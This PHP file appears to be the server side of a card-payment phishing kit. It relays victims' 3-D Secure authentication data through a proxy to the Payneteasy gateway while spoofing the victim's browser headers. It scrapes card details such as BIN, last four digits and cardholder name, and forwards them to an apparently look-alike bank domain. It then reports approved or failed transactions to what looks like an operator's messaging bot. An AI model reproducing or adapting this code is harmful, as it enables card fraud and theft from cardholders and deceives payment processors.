<?php
include $_SERVER['DOCUMENT_ROOT'].'/config.php';
date_default_timezone_set ('Europe/Moscow');

if (isset($_POST["PaRes"]) && isset($_POST["MD"])) {

    $ch = curl_init("https://gate.payneteasy.com/paynet/processor/mdm-result/".$_GET['mdresult']);

    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: gate.payneteasy.com',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Encoding: gzip, deflate, br',
        'Referer: '.$_SERVER['HTTP_REFERER'],
        'User-Agent: '.getallheaders()['User-Agent'],
        'Content-Type: application/x-www-form-urlencoded',

    ));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch,CURLOPT_ENCODING, 'gzip');
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($_POST));
    $session = curl_exec($ch);


    // $tsf = curl_getinfo($ch);
    curl_close($ch);



    preg_match_all('#<form name="returnform" action="(.+?)" method="POST">#is', $session, $action);
    preg_match_all('#<input type="hidden" name="(.+?)" value="#is', $session, $name);
    preg_match_all('#" value="(.+?)">#is', $session, $value);

    // var_dump($session);
    sleep(1);

    $param[$name[1][0]]= $value[1][0];
    $ch = curl_init("https://gate.payneteasy.com".$action[1][0]);

    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: gate.payneteasy.com',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Encoding: gzip, deflate, br',
        'Referer: https://gate.payneteasy.com/paynet/processor/mdm-result/'.$_GET['mdresult'],
        'User-Agent: '.getallheaders()['User-Agent'],
        'Content-Type: application/x-www-form-urlencoded',
        'Cookie: '.$name[1][0].'='.$value[1][0]

    ));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch,CURLOPT_ENCODING, 'gzip');
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($param));
    $session = curl_exec($ch);


    // $tsf = curl_getinfo($ch);
    curl_close($ch);
    //var_dump($tsf);
    // var_dump($session);

    preg_match_all('#<input type="hidden" name="tmp" value="(.+?)"/>#is', $session, $tmp);
    //$name[1][0]
    //  preg_match_all("#' value='(.+?)'/>#is", $session, $value);


    if($tmp[1][0] != NULL){
        sleep(1);
        $param['tmp'] = $tmp[1][0];
        $ch = curl_init("https://gate.payneteasy.com".$action[1][0]);

        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: gate.payneteasy.com',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding: gzip, deflate, br',
            'Referer: '."https://gate.payneteasy.com".$action[1][0],
            'User-Agent: '.getallheaders()['User-Agent'],
            'Content-Type: application/x-www-form-urlencoded',
            'Cookie: '.$name[1][0].'='.$value[1][0]

        ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch,CURLOPT_ENCODING, 'gzip');
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($param));
        $session = curl_exec($ch);


        // $tsf = curl_getinfo($ch);
        curl_close($ch);

    }



    preg_match_all('#<form name="returnform" action="(.+?)" method="POST">#is', $session, $action);
    preg_match_all('#<input type="hidden" name="error_message" value="(.+?)">#is', $session, $error_message);
    preg_match_all('#<input type="hidden" name="processor-tx-id" value="(.+?)">#is', $session, $processor_tx_id);
    preg_match_all('#<input type="hidden" name="amount" value="(.+?)">#is', $session, $amount);
    preg_match_all('#<input type="hidden" name="merchant_order" value="(.+?)">#is', $session, $merchant_order);
    preg_match_all('#<input type="hidden" name="orderid" value="(.+?)">#is', $session, $orderid);
    preg_match_all('#<input type="hidden" name="client_orderid" value="(.+?)">#is', $session, $client_orderid);
    preg_match_all('#<input type="hidden" name="bin" value="(.+?)">#is', $session, $bin);
    preg_match_all('#<input type="hidden" name="control" value="(.+?)">#is', $session, $control);
    preg_match_all('#<input type="hidden" name="descriptor" value="(.+?)">#is', $session, $descriptor);
    preg_match_all('#<input type="hidden" name="type" value="(.+?)">#is', $session, $type);
    preg_match_all('#<input type="hidden" name="card-type" value="(.+?)">#is', $session, $card_type);
    preg_match_all('#<input type="hidden" name="last-four-digits" value="(.+?)">#is', $session, $last_four_digits);
    preg_match_all('#<input type="hidden" name="card-holder-name" value="(.+?)">#is', $session, $card_holder_name);
    preg_match_all('#<input type="hidden" name="error_code" value="(.+?)">#is', $session, $error_code);//код ошибки вывести в админ
    preg_match_all('#<input type="hidden" name="dest-last-four-digits" value="(.+?)">#is', $session, $dest_last_four_digits);
    preg_match_all('#<input type="hidden" name="dest-bin" value="(.+?)">#is', $session, $dest_bin);
    preg_match_all('#<input type="hidden" name="dest-card-type" value="(.+?)">#is', $session, $dest_card_type);
    preg_match_all('#<input type="hidden" name="status" value="(.+?)">#is', $session, $status);//статус вывести в админ

    $data['error_message'] = $error_message[1][0];
    $data['processor-tx-id'] = $processor_tx_id[1][0];
    $data['amount'] = $amount[1][0];
    $data['merchant_order'] = $merchant_order[1][0];
    $data['orderid'] = $orderid[1][0];
    $data['client_orderid'] = $client_orderid[1][0];
    $data['bin'] = $bin[1][0];
    $data['control'] = $control[1][0];
    $data['descriptor'] = $descriptor[1][0];
    $data['type'] = $type[1][0];
    $data['card-type'] = $card_type[1][0];
    $data['last-four-digits'] = $last_four_digits[1][0];
    $data['card-holder-name'] = $card_holder_name[1][0];
    $data['error_code'] = $error_code[1][0];
    $data['dest-last-four-digits'] = $dest_last_four_digits[1][0];
    $data['dest-bin'] = $dest_bin[1][0];
    $data['dest-card-type'] = $dest_card_type[1][0];
    $data['status'] = $status[1][0];



    $ch = curl_init($action[1][0]);

    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: gaztransbank.dengisend.ru',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Encoding: gzip, deflate, br',
        'Referer: https://gate.payneteasy.com/',
        'User-Agent: '.getallheaders()['User-Agent'],
        'Content-Type: application/x-www-form-urlencoded',
        'Cookie: JSESSIONID='.$_SESSION['JSESSIONID']

    ));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch,CURLOPT_ENCODING, 'gzip');
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    $session = curl_exec($ch);
    $tsf = curl_getinfo($ch);

    // $tsf = curl_getinfo($ch);
    curl_close($ch);
    // var_dump($tsf);

    $ch = curl_init($tsf['redirect_url']);

    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: gaztransbank.dengisend.ru',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Encoding: gzip, deflate, br',
        'Referer: https://gate.payneteasy.com/',
        'User-Agent: '.getallheaders()['User-Agent'],
        // 'Content-Type: application/x-www-form-urlencoded',
        'Cookie: JSESSIONID='.$_SESSION['JSESSIONID']

    ));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    // curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch,CURLOPT_ENCODING, 'gzip');
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
    // curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    $session = curl_exec($ch);
    // $tsf = curl_getinfo($ch);

    // $tsf = curl_getinfo($ch);
    curl_close($ch);
    // var_dump($tsf);
    if($data['status'] == 'approved'){


        getSuccess($token,$bot_receiver,$chatid,$areaname,$zalet);
        header('Location: success.html');



    }else{

        getError($token,$chatid,$areaname,$data['error_message'],'');

        header('Location: error.html');


    }


    exit();

}else{
    header("HTTP/1.1 401 Unauthorized");
}